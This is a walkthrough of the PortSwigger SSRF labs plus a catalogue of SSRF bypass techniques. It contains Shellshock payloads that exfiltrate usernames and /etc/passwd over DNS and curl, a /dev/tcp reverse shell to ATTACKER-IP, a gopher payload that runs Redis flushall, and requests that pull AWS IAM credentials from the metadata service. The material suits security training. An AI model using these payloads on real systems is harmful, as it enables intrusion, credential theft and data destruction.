# Server-Side Request Forgery (SSRF) - Complete PortSwigger Labs Guide

## Table of Contents

1. [Introduction to SSRF](#introduction-to-ssrf)
2. [Lab Solutions](#lab-solutions)
   - [Lab 1: Basic SSRF Against Local Server](#lab-1-basic-ssrf-against-local-server)
   - [Lab 2: Basic SSRF Against Backend System](#lab-2-basic-ssrf-against-backend-system)
   - [Lab 3: SSRF with Blacklist-Based Input Filter](#lab-3-ssrf-with-blacklist-based-input-filter)
   - [Lab 4: SSRF with Whitelist-Based Input Filter](#lab-4-ssrf-with-whitelist-based-input-filter)
   - [Lab 5: Blind SSRF with Out-of-Band Detection](#lab-5-blind-ssrf-with-out-of-band-detection)
   - [Lab 6: Blind SSRF with Shellshock Exploitation](#lab-6-blind-ssrf-with-shellshock-exploitation)
   - [Lab 7: SSRF via OpenID Dynamic Client Registration](#lab-7-ssrf-via-openid-dynamic-client-registration)
   - [Lab 8: SSRF via Flawed Request Parsing](#lab-8-ssrf-via-flawed-request-parsing)
3. [SSRF Attack Techniques](#ssrf-attack-techniques)
4. [Burp Suite Workflow](#burp-suite-workflow)
5. [Real-World Examples and CVEs](#real-world-examples-and-cves)
6. [OWASP and Industry Standards](#owasp-and-industry-standards)
7. [Prevention and Mitigation](#prevention-and-mitigation)
8. [Tools and Automation](#tools-and-automation)

---

## Introduction to SSRF

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

### Impact

SSRF vulnerabilities can lead to:
- **Unauthorized actions** or access to data within the organization
- **Access to internal services** not directly accessible from the internet
- **Cloud instance metadata exposure** (AWS, Azure, GCP)
- **Port scanning** internal networks
- **Remote Code Execution** (when chained with other vulnerabilities)
- **Authentication bypass** via trusted relationships

### Common Vulnerable Parameters

- URL parameters in file upload/import features
- API endpoints that fetch remote resources
- Webhook configurations
- PDF generators and document processors
- Image processors and thumbnail generators
- RSS feed readers and aggregators
- Server-Side Template Injection (SSTI) contexts
- OAuth/OpenID callback URLs

---

## Lab Solutions

### Lab 1: Basic SSRF Against Local Server

**Difficulty**: Apprentice
**Objective**: Use the stock check feature to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

#### Vulnerability Description

The application has a stock check feature that retrieves data from an internal system. The `stockApi` parameter is vulnerable to SSRF, allowing requests to arbitrary internal endpoints.

#### Solution Steps

1. **Navigate to any product page** and click "Check stock"

2. **Intercept the request** in Burp Suite Proxy:
   ```http
   POST /product/stock HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net

   stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
   ```

3. **Send to Repeater** (Ctrl+R or right-click → "Send to Repeater")

4. **Modify the stockApi parameter** to target localhost admin:
   ```http
   stockApi=http://localhost/admin
   ```

5. **Observe the admin panel** in the response, showing delete user functionality

6. **Extract the delete URL** from the response (e.g., `/admin/delete?username=carlos`)

7. **Modify the request** to delete carlos:
   ```http
   stockApi=http://localhost/admin/delete?username=carlos
   ```

8. **Send the request** - Lab solved!

#### Key Techniques

- **Internal localhost access**: Using `localhost` or `127.0.0.1` to access internal services
- **Parameter manipulation**: Modifying URL parameters to forge server-side requests
- **Privilege escalation**: Accessing admin functionality via internal routing

#### HTTP Request Example

```http
POST /product/stock HTTP/1.1
Host: 0a9b00f603c8b97982a0f5d7009400b3.web-security-academy.net
Cookie: session=xyz123
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

stockApi=http://localhost/admin/delete?username=carlos
```

#### Common Mistakes

- Forgetting to URL-encode special characters in the payload
- Not inspecting the response to find the exact delete endpoint
- Attempting to access `/admin` directly through the browser instead of via SSRF

---

### Lab 2: Basic SSRF Against Backend System

**Difficulty**: Apprentice
**Objective**: Use the stock check feature to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then delete the user `carlos`.

#### Vulnerability Description

The application's stock check feature connects to an internal backend system. The admin interface exists on the internal network at `192.168.0.X:8080` but the exact IP is unknown, requiring enumeration.

#### Solution Steps

1. **Intercept the stock check request** and send to **Burp Intruder**

2. **Configure the payload position** in the stockApi parameter:
   ```http
   stockApi=http://192.168.0.§1§:8080/admin
   ```

3. **Configure Intruder settings**:
   - Attack type: **Sniper**
   - Payload type: **Numbers**
   - Number range: **1 to 255**
   - Step: **1**
   - Min/max integer digits: Leave default

4. **Disable payload encoding** (if needed for URL parameters)

5. **Start the attack** and monitor results

6. **Sort by Status Code** to find responses with **200 OK** (successful access)

7. **Identify the correct IP** (e.g., `192.168.0.47` returns 200 with admin panel)

8. **Send successful request to Repeater** and modify to delete carlos:
   ```http
   stockApi=http://192.168.0.47:8080/admin/delete?username=carlos
   ```

9. **Send the request** - Lab solved!

#### Key Techniques

- **Internal network enumeration**: Scanning private IP ranges to discover services
- **Port specification**: Targeting non-standard ports (8080)
- **Burp Intruder automation**: Using payload positions for efficient scanning

#### Burp Intruder Configuration

```
Positions tab:
POST /product/stock HTTP/1.1
...
stockApi=http://192.168.0.§1§:8080/admin

Payloads tab:
Payload type: Numbers
From: 1
To: 255
Step: 1
```

#### Response Indicators

- **Status 200**: Admin panel found
- **Status 500/404**: IP not hosting admin interface
- **Connection timeout**: IP not in use

#### Common Mistakes

- Not setting the correct number range (1-255 for the last octet)
- Forgetting the port number (8080)
- Not sorting results by status code to identify successful responses

---

### Lab 3: SSRF with Blacklist-Based Input Filter

**Difficulty**: Practitioner
**Objective**: Bypass blacklist-based anti-SSRF defenses to access `http://localhost/admin` and delete the user `carlos`.

#### Vulnerability Description

The application blocks requests containing:
1. Hostnames like `127.0.0.1` and `localhost`
2. Sensitive paths like `/admin`

These defenses can be bypassed using alternative IP representations and encoding techniques.

#### Solution Steps

1. **Test basic localhost access**:
   ```http
   stockApi=http://127.0.0.1/
   ```
   Result: **Blocked** - "External stock check host must be stock.weliketoshop.net"

2. **Bypass IP blacklist** using alternative representation:
   ```http
   stockApi=http://127.1/
   ```
   Result: **Success** - Response shows it's working

3. **Attempt to access admin**:
   ```http
   stockApi=http://127.1/admin
   ```
   Result: **Blocked** - "External stock check blocked for security reasons"

4. **Bypass path blacklist** using double URL encoding:
   - Encode 'a' once: `%61`
   - Encode 'a' twice: `%2561`

   ```http
   stockApi=http://127.1/%2561dmin
   ```
   Result: **Success** - Admin panel accessible

5. **Complete the attack** by deleting carlos:
   ```http
   stockApi=http://127.1/admin/delete?username=carlos
   ```
   Or with encoding:
   ```http
   stockApi=http://127.1/%2561dmin/delete?username=carlos
   ```

6. **Send the request** - Lab solved!

#### Key Techniques

- **Alternative IP representations**:
  - `127.1` instead of `127.0.0.1`
  - `127.0.1` (shorthand)
  - `2130706433` (decimal notation)
  - `0x7f000001` (hexadecimal)
  - `017700000001` (octal)

- **Double URL encoding**:
  - Character → URL encode → URL encode again
  - `a` → `%61` → `%2561`
  - Bypasses filters that decode input once but backend decodes twice

- **Case variation**:
  - `AdMin`, `ADMIN`, `aDmIn` (if filter is case-sensitive)

#### Alternative Bypass Payloads

```http
# Decimal IP representation
stockApi=http://2130706433/admin

# Hexadecimal IP representation
stockApi=http://0x7f000001/admin

# Octal representation
stockApi=http://017700000001/admin

# IPv6 localhost
stockApi=http://[::1]/admin

# Domain with embedded null byte (some parsers)
stockApi=http://localhost%00.stock.weliketoshop.net/admin

# URL encoding bypass
stockApi=http://127.1/%61dmin

# Mixed encoding
stockApi=http://127.1/ad%6din
```

#### Common Mistakes

- Only encoding once when double encoding is required
- Not trying alternative IP representations
- Assuming all characters need encoding (only the blocked ones)

---

### Lab 4: SSRF with Whitelist-Based Input Filter

**Difficulty**: Expert
**Objective**: Bypass whitelist-based anti-SSRF defenses to access `http://localhost/admin` and delete the user `carlos`.

#### Vulnerability Description

The application validates that the supplied URL belongs to an expected domain (`stock.weliketoshop.net`). However, URL parsing inconsistencies can be exploited to bypass this whitelist validation.

#### Solution Steps

1. **Test basic modification**:
   ```http
   stockApi=http://127.0.0.1/
   ```
   Result: **Blocked** - External stock check host validation

2. **Attempt embedded credentials format**:
   ```http
   stockApi=http://localhost@stock.weliketoshop.net/
   ```
   Result: **Accepted** - Validation bypassed!

3. **Test with fragment identifier**:
   ```http
   stockApi=http://localhost#@stock.weliketoshop.net/
   ```
   Result: **Rejected** - "External stock check host must be stock.weliketoshop.net"

4. **Apply double URL encoding to the hash**:
   - `#` → `%23` → `%2523`

   ```http
   stockApi=http://localhost%2523@stock.weliketoshop.net/
   ```
   Result: **Internal Server Error** - Parser attempts to connect to "localhost%23"

5. **Craft final exploit** targeting localhost with encoded fragment:
   ```http
   stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
   ```
   Result: **Success** - Admin panel accessible

6. **Delete carlos**:
   ```http
   stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
   ```

7. **Send the request** - Lab solved!

#### Key Techniques

- **URL Parsing Inconsistencies**:
  - URL format: `protocol://username:password@hostname:port/path?query#fragment`
  - Validation layer may parse differently than connection layer

- **Embedded Credentials Bypass**:
  ```
  http://attacker.com@trusted.com
  ```
  - Some parsers see `trusted.com` as the host
  - Other parsers see `attacker.com` as the host with `trusted.com` as username

- **Double-Encoded Fragment**:
  ```
  http://localhost:80%2523@stock.weliketoshop.net/
  ```
  - `%2523` decodes to `%23` (encoded hash)
  - Validation sees `@stock.weliketoshop.net` as the host
  - Connection layer decodes again: `#@stock.weliketoshop.net` (everything after # is ignored)
  - Actual connection goes to `localhost:80`

#### URL Parsing Exploitation

```
Original URL structure:
http://username@hostname/path

Exploited structure:
http://localhost:80%2523@stock.weliketoshop.net/admin

Validation layer sees:
- Host: stock.weliketoshop.net (after @)
- Path: /admin
✓ Passes whitelist check

Execution layer decodes %2523 → %23 → #:
- Host: localhost:80
- Fragment: @stock.weliketoshop.net/admin (ignored)
✓ Connects to localhost
```

#### Alternative Bypass Techniques

```http
# Subdomain prefix bypass (if weak validation)
stockApi=http://stock.weliketoshop.net.attacker.com/

# Open redirect on trusted domain
stockApi=http://stock.weliketoshop.net/redirect?url=http://localhost/admin

# Parameter pollution
stockApi=http://stock.weliketoshop.net@localhost/admin

# Backslash bypass (Windows-style paths)
stockApi=http://stock.weliketoshop.net\@localhost/admin
```

#### Common Mistakes

- Not understanding the difference between URL validation and URL execution parsing
- Single encoding the fragment instead of double encoding
- Forgetting to specify the port (`:80`)
- Not checking if the whitelist validation is substring-based or anchor-based

---

### Lab 5: Blind SSRF with Out-of-Band Detection

**Difficulty**: Practitioner
**Objective**: Use the analytics software's Referer header processing to trigger an HTTP request to Burp Collaborator.

#### Vulnerability Description

The application uses analytics software that fetches the URL specified in the Referer header when a product page is loaded. This creates a blind SSRF vulnerability where you don't see the response, but can detect the vulnerability through out-of-band interactions.

#### Solution Steps

1. **Open Burp Collaborator**:
   - Burp menu → Burp Collaborator client
   - Click "Copy to clipboard" to get your unique domain
   - Example: `abc123xyz.burpcollaborator.net`

2. **Visit any product page** and intercept the request

3. **Send the request to Repeater**

4. **Modify the Referer header** to include your Collaborator domain:
   ```http
   GET /product?productId=1 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Referer: http://abc123xyz.burpcollaborator.net
   ```

5. **Send the request**

6. **Return to Burp Collaborator** and click "Poll now"

7. **Observe DNS and HTTP interactions** - Lab solved!

#### Key Techniques

- **Blind SSRF Detection**: Detecting vulnerabilities without seeing direct responses
- **Out-of-Band Channels**: Using DNS/HTTP callbacks to confirm exploitation
- **Referer Header Exploitation**: Leveraging analytics software that processes Referer headers
- **Burp Collaborator**: External service for detecting blind vulnerabilities

#### HTTP Request Example

```http
GET /product?productId=1 HTTP/1.1
Host: 0a8b004e03d4c9a080f3762300d00044.web-security-academy.net
User-Agent: Mozilla/5.0
Referer: http://abc123xyz.burpcollaborator.net
Cookie: session=xyz123
```

#### Burp Collaborator Interactions

When successful, you'll see:
- **DNS queries**: The server resolves your Collaborator domain
- **HTTP requests**: The server makes an HTTP GET request to fetch the URL
- **Request details**: Full headers, IP address, and timing information

#### Why This Works

```
User Request → Product Page
           ↓
    Analytics Software
           ↓
  Fetches Referer URL
           ↓
    Burp Collaborator
           ↓
    Logs Interaction
```

#### Alternative Detection Methods

```http
# Using Referer with path
Referer: http://abc123xyz.burpcollaborator.net/product-analytics

# DNS-only detection (if HTTP is blocked)
Referer: http://dns-only.abc123xyz.burpcollaborator.net

# With authentication test
Referer: http://user:pass@abc123xyz.burpcollaborator.net

# Subdomain indication
Referer: http://ssrf-test.abc123xyz.burpcollaborator.net
```

#### Common Mistakes

- Forgetting to poll Burp Collaborator for results
- Not including `http://` in the Referer value
- Using HTTPS when the server can't validate certificates
- Not waiting long enough for asynchronous processing

---

### Lab 6: Blind SSRF with Shellshock Exploitation

**Difficulty**: Expert
**Objective**: Perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port `8080`, exploiting Shellshock to exfiltrate the OS username.

#### Vulnerability Description

The application uses analytics software that processes the Referer header and passes the User-Agent string to an internal command execution context vulnerable to Shellshock (CVE-2014-6271). This allows remote code execution on internal systems.

#### Solution Steps

1. **Install Collaborator Everywhere**:
   - BApp Store → Collaborator Everywhere
   - Automatically injects Collaborator payloads

2. **Configure Burp target scope**:
   - Add lab domain to scope
   - Right-click domain → "Add to scope"

3. **Browse the application** and observe Collaborator interactions via Referer header

4. **Generate a Burp Collaborator payload**:
   - Burp Collaborator client → "Copy to clipboard"
   - Example: `abc123xyz.burpcollaborator.net`

5. **Craft Shellshock payload**:
   ```bash
   () { :; }; /usr/bin/nslookup $(whoami).abc123xyz.burpcollaborator.net
   ```

6. **Intercept a product page request** and send to Burp Intruder

7. **Configure Intruder attack**:
   - **User-Agent**: Replace with Shellshock payload
   - **Referer**: Set payload position for IP scanning

   ```http
   GET /product?productId=1 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   User-Agent: () { :; }; /usr/bin/nslookup $(whoami).abc123xyz.burpcollaborator.net
   Referer: http://192.168.0.§1§:8080
   ```

8. **Configure payload**:
   - Payload type: Numbers
   - From: 1, To: 255, Step: 1

9. **Start the attack**

10. **Poll Burp Collaborator** to check for DNS interactions

11. **Observe the DNS lookup** with the OS username:
    ```
    DNS query: peter-a7b8c9.abc123xyz.burpcollaborator.net
    ```
    Username: `peter-a7b8c9`

12. **Submit the username** - Lab solved!

#### Key Techniques

- **Shellshock Exploitation (CVE-2014-6271)**:
  ```bash
  () { :; }; COMMAND
  ```
  - Bash vulnerability allowing arbitrary command execution
  - Exploited via environment variables (like User-Agent)

- **DNS Exfiltration**:
  ```bash
  nslookup $(whoami).attacker.com
  ```
  - Exfiltrates data via DNS subdomain
  - Works even when HTTP egress is blocked

- **Blind SSRF Chaining**:
  - Referer header triggers internal request
  - User-Agent header contains exploit payload
  - Internal server executes commands
  - DNS callback confirms exploitation

#### Shellshock Payload Breakdown

```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

# () { :; };        - Malicious function definition exploiting bash
# /usr/bin/nslookup - Command to execute
# $(whoami)         - Subshell to get username
# .COLLABORATOR     - Append to DNS query for exfiltration
```

#### HTTP Request Example

```http
GET /product?productId=1 HTTP/1.1
Host: 0a9f00f803d4c9a080f3762300d00044.web-security-academy.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).abc123xyz.burpcollaborator.net
Referer: http://192.168.0.47:8080
Cookie: session=xyz123
```

#### Alternative Shellshock Payloads

```bash
# Extract /etc/passwd
() { :; }; /usr/bin/nslookup $(cat /etc/passwd | base64 | cut -c1-50).COLLABORATOR

# Exfiltrate via HTTP (if allowed)
() { :; }; /usr/bin/curl http://COLLABORATOR/$(whoami)

# Reverse shell
() { :; }; /bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1

# File listing
() { :; }; /usr/bin/nslookup $(ls -la | base64 | tr -d '\n' | cut -c1-60).COLLABORATOR

# Current directory
() { :; }; /usr/bin/nslookup $(pwd | tr '/' '-').COLLABORATOR
```

#### Burp Intruder Configuration

```
Positions tab:
GET /product?productId=1 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).abc123xyz.burpcollaborator.net
Referer: http://192.168.0.§1§:8080

Payloads tab:
Payload type: Numbers
From: 1
To: 255
Step: 1
```

#### Common Mistakes

- Not URL-encoding the Shellshock payload (usually not required in User-Agent)
- Forgetting the port number (8080) in the Referer
- Not polling Collaborator frequently enough (server-side execution may be delayed)
- Using commands that aren't installed on the target system
- DNS query length limitations (keep exfiltrated data under 255 chars)

#### CVE-2014-6271: Shellshock

- **Discovered**: September 2014
- **Affected**: GNU Bash versions 1.14 through 4.3
- **CVSS Score**: 10.0 (Critical)
- **Impact**: Remote code execution via environment variable manipulation
- **Common vectors**: CGI scripts, DHCP clients, SSH forced commands, User-Agent headers

---

### Lab 7: SSRF via OpenID Dynamic Client Registration

**Difficulty**: Expert
**Objective**: Exploit unsafe OpenID dynamic client registration to perform SSRF and steal AWS IAM credentials from the EC2 metadata service.

#### Vulnerability Description

The OAuth provider supports OpenID dynamic client registration, allowing unauthenticated users to register OAuth clients with arbitrary properties. The `logo_uri` property is fetched by the server without validation, creating an SSRF vulnerability that can access cloud instance metadata.

#### Solution Steps

1. **Log in with provided credentials**:
   ```
   Username: wiener
   Password: peter
   ```

2. **Discover OpenID configuration**:
   - Click "Log in" and observe OAuth flow
   - Navigate to: `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration`
   - Identify registration endpoint: `/reg`

3. **Register a test client** with Burp Collaborator:
   ```http
   POST /reg HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json

   {
     "redirect_uris": ["https://example.com"],
     "logo_uri": "http://abc123xyz.burpcollaborator.net"
   }
   ```

4. **Extract client_id** from response:
   ```json
   {
     "client_id": "AbCdEfGhIjKlMnOp",
     ...
   }
   ```

5. **Request the logo** to trigger SSRF:
   ```http
   GET /client/AbCdEfGhIjKlMnOp/logo HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   ```

6. **Confirm SSRF** in Burp Collaborator (HTTP request received)

7. **Exploit to access AWS metadata**:
   ```http
   POST /reg HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json

   {
     "redirect_uris": ["https://example.com"],
     "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
   }
   ```

8. **Extract new client_id** from response

9. **Request the logo** to retrieve credentials:
   ```http
   GET /client/NEW-CLIENT-ID/logo HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   ```

10. **Extract AWS credentials** from response:
    ```json
    {
      "Code": "Success",
      "AccessKeyId": "ASIA...",
      "SecretAccessKey": "abc123...",
      "Token": "IQoJb3JpZ2luX2VjE...",
      "Expiration": "2024-01-15T12:00:00Z"
    }
    ```

11. **Submit the secret access key** - Lab solved!

#### Key Techniques

- **OpenID Dynamic Client Registration**:
  - RFC 7591 allows runtime OAuth client registration
  - No authentication required by default
  - Clients can specify metadata including `logo_uri`

- **AWS EC2 Instance Metadata Service**:
  - Endpoint: `http://169.254.169.254/latest/meta-data/`
  - Provides instance configuration, IAM roles, and credentials
  - IMDSv1: Simple HTTP GET requests (vulnerable to SSRF)
  - IMDSv2: Requires session token in custom header (SSRF-resistant)

- **OAuth Property Abuse**:
  - `logo_uri`: Server fetches logo from URL
  - `redirect_uris`: Can contain open redirects
  - `jwks_uri`: SSRF via JSON Web Key Set fetching
  - `sector_identifier_uri`: Another potential SSRF vector

#### OpenID Configuration Discovery

```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-server.example.com
```

Response includes:
```json
{
  "issuer": "https://oauth-server.example.com",
  "authorization_endpoint": "...",
  "token_endpoint": "...",
  "registration_endpoint": "https://oauth-server.example.com/reg",
  "logo_uri": "..."
}
```

#### Dynamic Client Registration Request

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json
Content-Length: 156

{
  "redirect_uris": [
    "https://example.com/callback"
  ],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

#### AWS Metadata Endpoints

```bash
# List IAM roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get role credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME/

# Instance identity document
http://169.254.169.254/latest/dynamic/instance-identity/document

# User data (may contain secrets)
http://169.254.169.254/latest/user-data

# Hostname
http://169.254.169.254/latest/meta-data/hostname

# Public SSH keys
http://169.254.169.254/latest/meta-data/public-keys/
```

#### Alternative SSRF Targets

```http
# Azure Instance Metadata Service
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud Metadata
http://metadata.google.internal/computeMetadata/v1/

# DigitalOcean Metadata
http://169.254.169.254/metadata/v1/

# Oracle Cloud Infrastructure
http://169.254.169.254/opc/v2/instance/
```

#### Common Mistakes

- Using HTTPS instead of HTTP for metadata endpoint (metadata service doesn't support HTTPS)
- Not noting the client_id from the registration response
- Forgetting to URL-encode the logo_uri if sending as form data
- Not checking if the OAuth server has firewall restrictions on Collaborator

#### Real-World Impact

This vulnerability class has been found in:
- **Capital One breach (2019)**: SSRF in WAF led to AWS metadata access, exposing 100M+ records
- **Multiple bug bounty findings**: OAuth providers exposing metadata services
- **CVE-2019-5418**: Rails SSRF via file:// protocol in render parameter

---

### Lab 8: SSRF via Flawed Request Parsing

**Difficulty**: Expert
**Objective**: Exploit routing-based SSRF due to flawed request parsing to access an internal admin panel and delete the user `carlos`.

#### Vulnerability Description

The application uses a load balancer or reverse proxy that parses the request's intended host differently than the backend server. By supplying an absolute URL in the request line while manipulating the Host header, you can bypass validation and access internal systems.

#### Solution Steps

1. **Test Host header validation**:
   ```http
   GET / HTTP/1.1
   Host: attacker.com
   ```
   Result: **Blocked** - Invalid Host header

2. **Use absolute URL** in request line:
   ```http
   GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
   Host: attacker.com
   ```
   Result: **Success** - Validation bypassed!

3. **Confirm SSRF capability** with Burp Collaborator:
   ```http
   GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
   Host: abc123xyz.burpcollaborator.net
   ```
   Check Collaborator for HTTP interactions

4. **Scan internal network** for admin interface:
   - Send to Burp Intruder
   - **Important**: Disable "Update Host header to match target"
     - Intruder → Attack menu → Uncheck "Update Host header to match target"

   ```http
   GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
   Host: 192.168.0.§1§:8080
   ```

5. **Configure Intruder payload**:
   - Payload type: Numbers
   - From: 1, To: 255, Step: 1

6. **Start attack** and identify successful response (Status 200)
   - Example: `192.168.0.147:8080` returns admin panel

7. **Access admin panel**:
   ```http
   GET https://YOUR-LAB-ID.web-security-academy.net/admin HTTP/1.1
   Host: 192.168.0.147:8080
   ```

8. **Extract CSRF token** from delete form in response:
   ```html
   <form action="/admin/delete" method="POST">
     <input name="csrf" value="AbCd123XyZ">
     <input name="username" value="carlos">
   </form>
   ```

9. **Delete carlos** with POST request:
   ```http
   POST https://YOUR-LAB-ID.web-security-academy.net/admin/delete HTTP/1.1
   Host: 192.168.0.147:8080
   Cookie: session=YOUR-SESSION
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 53

   csrf=AbCd123XyZ&username=carlos
   ```

10. **Send the request** - Lab solved!

#### Key Techniques

- **Request Line Absolute URLs**:
  ```http
  GET https://example.com/path HTTP/1.1
  ```
  - RFC 7230 allows absolute URIs in request line
  - Some proxies use this for routing
  - Backend may use Host header instead

- **Host Header Injection via Routing**:
  - Frontend proxy parses absolute URL for routing
  - Backend server parses Host header for request handling
  - Disconnect allows accessing internal hosts

- **SSRF via Request Parsing Inconsistency**:
  ```
  Request Line: https://public-site.com/admin
  Host Header:  internal-backend:8080

  Frontend sees: Route to public-site.com
  Backend sees:  Request for internal-backend:8080/admin
  ```

#### HTTP Request Flow

```
Client request:
GET https://lab.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.147:8080

        ↓

Load Balancer/Proxy:
- Reads request line: https://lab.web-security-academy.net/admin
- Routes to lab.web-security-academy.net servers
- Forwards request

        ↓

Backend Server:
- Reads Host header: 192.168.0.147:8080
- Processes request for internal admin panel
- Returns admin interface
```

#### Alternative Host Header Attacks

```http
# Host override headers
X-Forwarded-Host: internal-admin.local
X-Host: 192.168.0.1
X-Forwarded-Server: admin-panel:8080

# Duplicate Host headers
Host: public-site.com
Host: internal-backend:8080

# Host header with port
Host: public-site.com:80@internal-backend:8080

# Absolute URL with different Host
GET http://public-site.com/ HTTP/1.1
Host: internal-backend:8080
```

#### Burp Intruder Critical Configuration

**Must disable**: "Update Host header to match target"

Location: Intruder → Attack menu (top menu bar) → Uncheck option

Without this, Burp will override your Host header with the target host, breaking the attack.

#### Common Mistakes

- Not using an absolute URL in the request line
- Forgetting to disable "Update Host header to match target" in Intruder
- Not extracting and including the CSRF token in the delete request
- Not using POST method for the delete action
- Missing the session cookie in the final request

#### Real-World Examples

- **CVE-2018-8004**: Apache Camel SSRF via HTTP Host header
- **CVE-2021-21972**: VMware vCenter SSRF via Host header
- **Cache poisoning attacks**: Host header manipulation to poison web caches
- **Password reset poisoning**: Host header influences reset link generation

---

## SSRF Attack Techniques

### 1. Alternative IP Representations

#### Localhost Representations

```
# Standard
http://127.0.0.1/
http://localhost/

# Shorthand
http://127.1/
http://127.0.1/

# Decimal (IP to integer)
http://2130706433/

# Hexadecimal
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# Octal
http://017700000001/
http://0177.0000.0000.0001/

# Mixed encoding
http://0x7f.0.0.1/

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/

# Rare formats
http://0/
http://0.0.0.0/
```

#### Internal Network Ranges

```
# Class A (10.0.0.0/8)
http://10.0.0.1/
http://167772161/      # Decimal

# Class B (172.16.0.0/12)
http://172.16.0.1/

# Class C (192.168.0.0/16)
http://192.168.0.1/
http://3232235521/     # Decimal

# Link-local (169.254.0.0/16)
http://169.254.169.254/  # Cloud metadata
```

### 2. URL Encoding and Obfuscation

#### Single URL Encoding

```
# Encode 'a' in admin
http://127.0.0.1/%61dmin

# Encode 'l' in localhost
http://%6cocal%68ost/

# Encode dots
http://127%2e0%2e0%2e1/

# Encode slashes
http://127.0.0.1%2fadmin
```

#### Double URL Encoding

```
# 'a' → %61 → %2561
http://127.0.0.1/%2561dmin

# Full path
http://127.0.0.1/%2561d%256din/%2564%2565%256c%2565%2574%2565
```

#### Unicode and Alternative Encodings

```
# Unicode
http://127.0.0.1/\u0061dmin

# HTML entities (in some contexts)
http://127.0.0.1/&num97;dmin

# UTF-8 encoding
http://127.0.0.1/%C0%AE%C0%AE/admin
```

### 3. DNS Rebinding

DNS rebinding attacks exploit time-of-check to time-of-use (TOCTOU) vulnerabilities:

```
1. Application checks: attacker.com → 1.2.3.4 (public IP) ✓
2. Short TTL expires
3. Application connects: attacker.com → 127.0.0.1 (localhost)
```

Tools:
- **rbndr.us**: Simple DNS rebinding service
- **rebinder.net**: Configurable rebinding
- **dnsrebind.it**: Custom DNS rebinding platform

### 4. Open Redirect Chaining

Bypass whitelist by chaining through trusted open redirects:

```http
# Trusted domain with open redirect
stockApi=http://stock.weliketoshop.net/redirect?url=http://localhost/admin

# URL parameter injection
stockApi=http://trusted-site.com?next=http://169.254.169.254/latest/meta-data/
```

### 5. Protocol Smuggling

#### Different Protocols

```
# Gopher (raw TCP)
gopher://127.0.0.1:6379/_KEYS%20*

# File protocol
file:///etc/passwd

# Dict protocol
dict://127.0.0.1:11211/stats

# LDAP
ldap://localhost:389/dc=example,dc=com

# SFTP
sftp://internal-server/file.txt
```

#### Gopher Protocol for Redis Exploitation

```
# Redis command injection via Gopher
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a

# HTTP request smuggling via Gopher
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

### 6. CRLF Injection

Inject HTTP headers via CRLF sequences:

```
# Basic CRLF injection
http://127.0.0.1/%0d%0aHeader-Injection:value

# Full request smuggling
http://127.0.0.1/%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a%0d%0a
```

### 7. Bypassing Input Validation

#### Blacklist Bypasses

```
# Case variation
http://LocalHost/admin
http://LOCALHOST/ADMIN

# Whitespace and special characters
http://127.0.0.1 /admin
http://127.0.0.1%09/admin  # Tab
http://127.0.0.1%00/admin  # Null byte

# Rare URL formats
http://0x7f.1/admin
http://127.000.000.001/admin

# @-based bypasses
http://trusted.com@127.0.0.1/admin
http://127.0.0.1@trusted.com/admin
```

#### Whitelist Bypasses

```
# Subdomain
http://trusted-domain.attacker.com

# Path traversal
http://trusted.com/../../../localhost/admin

# Fragment/anchor abuse
http://localhost#@trusted.com

# URL parameter pollution
http://trusted.com?url=http://localhost/admin

# Credentials in URL
http://user:pass@trusted.com:80@localhost/admin
```

### 8. Cloud Metadata Exploitation

#### AWS EC2 Metadata

```
# List IAM roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/

# Instance identity
http://169.254.169.254/latest/dynamic/instance-identity/document

# User data (may contain secrets)
http://169.254.169.254/latest/user-data

# IMDSv2 (requires token - harder to exploit)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
